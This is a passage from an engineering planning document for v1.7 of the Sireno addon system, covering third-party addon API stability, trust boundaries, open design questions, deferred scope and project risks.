**Specific trap:** the `tsx` import seam at `loader.ts:95-104` does not distinguish between "this is a typo in the addon path" and "this is a malicious addon trying to read `/etc/passwd`". Both produce a "module not found" error. The error message must not leak the full filesystem path of the failing import — it currently does, which is a (minor) information disclosure. The plan should add a `redactPath` filter to the loader's error formatter.

### CC-5 — API stability for 3rd-party (FX-10 + FX-11)

The `addon/api.ts:14` `SIRENO_ADDON_API_VERSION = 1` is the single version bump point. If a v1.7 change (e.g. the new `ValueDisplay` addon's schema field, or a new `methods` helper) introduces a *breaking* contract change, we either bump to 2 (which breaks all existing 3rd-party addons until they re-release) or stay on 1 and accept the additive change. **Honest declaration of the stable surface:**

- **Stable in v1.7:** `SIRENOAddon` shape (`apiVersion`, `name`, `buttons`, `assets`, optional `decks`); `AddonButtonDefinition` shape (`type`, `configSchema`, `defaultIntervalMs`, `defaultPollIntervalMs`, `defaultRenderIntervalMs`, `onActivate`, `onDeactivate`, `onPress`, `onRelease`, `onTap`, `onDblTap`, `onHold`, `dispose`, `poll`, `refresh`, `render`); `AddonButtonMethods` shape (`getActiveDeckId`, `goBack`, `invalidate`, `keyMacro`, `navigateToDeck`, `pasteText`, `runCommand`); the icon protocol (`icon://`, `addon://`, `builtin://`, `brand://`, `data:`, `https?://`); the theme presentation seam (`useThemeUiPresentation` + `surfaces.iconLabel|bars|splitAction`).
- **NOT stable in v1.7 (subject to change in v1.8+):** the exact render output of `Icon`, `Label`, `Text`, `Bars`, `LabelValueList` (visual contracts are theme-overridable but the defaults may shift); the `Bars` `items` schema (FX-07 may add a `formatter` field); the `LabelValueList` `lines` schema (FX-08 may split `stack` into `stack-3` / `stack-4`); the `keyMacro` provider's parser surface (any new modifier tokens would be additive, but the `KeyMacroStep` shape is stable).
- **Honest warning:** the test 3rd-party addon at `/works/test/test-sireno-deck` and theme at `/works/test/test-sireno-deck-theme` are the first code authored against the v1.7 surface. Any post-v1.7 breaking change to the stable surface will break them. The plan should add a `loader.test.ts` integration test that resolves the real on-disk paths and asserts a known shape — so a future refactor that breaks the surface fails CI before merging.

**Specific trap:** the existing v1.3-v1.6 first-party addons (date-time, weather, system-status, media-player, emoji-selector, brightness, core-buttons, internal-settings) are *not* 3rd-party — they ship in the same `node_modules` and are loaded by the same registry, but they are committed to the repo and reviewed by the maintainer. The 3rd-party trust boundary only matters for code outside the repo (or in `/works/test/...`). The plan must not conflate "the loader accepts arbitrary TS" with "the loader accepts untrusted TS" — the first is a design fact, the second is a policy decision. Today's policy is: trusted (because the user opted in by adding the path to config). A future v2 might add a `--sandbox-addons` flag backed by `child_process.fork` + `vm.Context`, but that's a v2 feature, not v1.7.

## Open Questions

1. **Should `methods.pasteText` keep its current name (clipboard-write-only) and add a new `methods.pasteAndType` (or `methods.simulatePaste`) helper, or should `pasteText` be redefined to mean "write + paste"?** The FX-05 fix changes user-visible behavior of an existing API. A new name is safer for 3rd-party addons that might rely on the current "write only" semantics. The plan should call this out.
2. **For the FX-08 layout change, do 3rd-party themes that override `surfaces.bars` or `surfaces.labelValueList` need to be updated?** If yes, that's a breaking change to the surface contract. If no, the default layout change must happen *inside* the default render path, not at the dispatch level.
3. **For FX-10 / FX-11, should the test addon/theme be moved into the repo under `packages/cli/fixtures/` (alongside `phase-23-local-raw-addon`)?** The current `/works/test/...` path is outside the repo and not committed, which makes CI integration test impossible. Moving it into the repo as a fixture is the "make the test run in CI" path; keeping it outside is the "user-trust boundary is real" path. The plan must pick one.
4. **For the chrome overlay (FX-04), is `icon:` always a file path (per `loader.test.ts:1356-1359` asserting the absolute path), or can it also be a Lucide icon name (per `Icon.tsx` resolving `icon://foo`)?** The runtime's `Icon` component supports both, but `system-buttons.ts:54-66` does not read the `icon` field at all. The fix must handle both shapes.
5. **For FX-06 (macros not sent), do we want a "test mode" flag that simulates macro execution without actually calling xdotool/osascript/SendKeys?** Useful for CI (the in-process test can assert the macro step shape without OS dependencies) and useful for users who want to dry-run a config. Currently no such flag exists; the plan should decide.
6. **For the new `ValueDisplay` addon (FX-09), does it need a deck type (i.e. `addons.decks`) or only a button type?** If only a button, the manifest is simpler; if it also ships a deck, it competes with the user's main deck for the home slot. The plan must scope this.
7. **For FX-01, is the "delay" the user is reporting on the order of 50ms (acceptable) or 500ms+ (regression)?** The plan should ask the user to time a single "settings → main" back tap and report the perceived delay. A 50ms blip is below the 200ms PERF-01 target and may not be worth a fix; a 500ms+ delay is a real regression and warrants the full profile run.
8. **For the FX-02 fix, do we need the `lastTapAt` field to be per-button (current gesture state model) or global (one Map, not a per-key field)?** Per-button is more correct (the user can double-tap button 3 while holding button 7), but it adds a new field to `ButtonGestureState` which the spread fix must handle. Global is simpler but allows button-A's double-tap to swallow button-B's first tap if pressed in the same 400ms window.
9. **For the chrome overlay (FX-04 + FX-06 combined), is the "Unclose tab" button (Ctrl+Shift+T) the right test case for verifying that the icon resolution AND the macro execution both work end-to-end?** It is a single button that exercises both: a non-default `icon` (`rotate-ccw`) and a non-trivial key macro. If that button works, the chrome deck is honest. If it doesn't, the failure isolates to either the icon resolution or the key macro path.
10. **For the `ValueDisplay` addon (FX-09), what does the user want to *display*?** A number, a string, a formatted date, a value pulled from an HTTP endpoint? The plan should narrow the scope before discussion; "ValueDisplay" is a vague name that could mean 6 different things.

## What is explicitly OUT of scope for v1.7

These are items the user might raise during `discuss-phase` that should be deferred to v1.8 or later. Listing them here makes the deferral explicit.

- **A real sandbox for 3rd-party addons (child_process.fork + vm.Context).** This is a v2+ feature with significant API stability implications. v1.7's answer is "document the trust model, keep the existing `assertRawSourceModuleGraph` guard."
- **A real sandbox for 3rd-party themes.** Same as above.
- **Bumping `SIRENO_ADDON_API_VERSION` to 2.** v1.7's changes to the addon API are additive and backwards-compatible (per the v1.6 ROADMAP line 240). The version stays at 1. If a v1.8 phase needs a breaking change, that's the bump point.
- **Configurable back-button double-tap threshold.** `DOUBLE_TAP_DELAY_MS = 400` is hardcoded (per the v1.6 REQUIREMENTS v2-candidate at line 162). FX-02's fix does not change the threshold; it only fixes the no-callback branch.
- **Configurable `current_brightness` poll interval.** v1.7's FX-01 fix may adjust the interval (e.g. to 2s) but does not expose it as a config field.
- **Auto-brightness based on ambient light or time of day.** Deferred to v2 per v1.6 REQUIREMENTS line 161.
- **CI matrix builds for Linux + Mac.** Deferred per v1.6 REQUIREMENTS line 160. The v1.7 3rd-party smoke test must be runnable on at least Linux (the dev environment); macOS/Windows UAT is still manual.
- **A user-facing theme picker UI.** Themes are currently selected via `config.yml: theme: 'dark'`; there is no in-app picker. v1.7's 3rd-party theme test exercises the existing config-driven path, not a new picker.
- **Distribution build pipeline (Phases 40/47/48).** Still deferred to v1.8 per v1.6 REQUIREMENTS line 159.
- **A `key_macro` provider test on real macOS or Windows.** The CI environment is Linux. The plan must include macOS-conditional skip patterns (`if (process.platform === 'darwin')`) but cannot require macOS CI.

## What could still go wrong (beyond the FX cards)

These are risks that the FX cards do not directly cover, but that the v1.7 plan should keep in mind.

- **Phase ordering matters.** FX-10 and FX-11 are test fixtures; if they ship before FX-09 (the new `ValueDisplay` addon), the loader test must *not* exercise the test fixtures until the loader can distinguish "3rd-party test" from "user-facing addon." The plan must order FX-09 → FX-10 → FX-11.
- **CONTEXT drift across phases.** v1.6 had 4 gap-closure phases (67/68/69/70) because the original 3 phases (63/64/65) were never planned. The v1.7 plan must not ship a "v1.7-RESEARCH.md" without a matching `v1.7-ROADMAP.md` and `v1.7-REQUIREMENTS.md` — the gap-closure pattern from `.planning/solutions/workflow-issues/user-redesign-mid-uat-invalidate-context-2026-06-15.md` is the right shape to follow if mid-UAT a phase needs to be re-scoped.
- **The 113/120 pre-existing test baseline.** The v1.6 verification noted 7 pre-existing test failures (`69-VERIFICATION.md`). v1.7's plan must not chase those failures — they are noise. The plan must document the pre-existing baseline at the start of v1.7 and exclude it from the per-phase verification verdicts (per the aggregation-only pattern at `.planning/solutions/best-practices/aggregation-only-verification-sweep-2026-06-15.md`).
- **The CHANGELOG entry.** v1.6 was a breaking-changes milestone (main deck home button replaced, etc.). v1.7 may also be breaking if `pasteText` semantics change (FX-05) or if the system-buttons dispatcher changes shape (FX-03). The plan must call out breaking changes in CHANGELOG, not in passing.
- **The 7 v1.6 quick tasks that were never closed.** STATE.md quick tasks 037-044 are listed but #043 has "(pending)" and the rest are committed. The v1.7 plan should not pile more unclosed quick tasks on top.
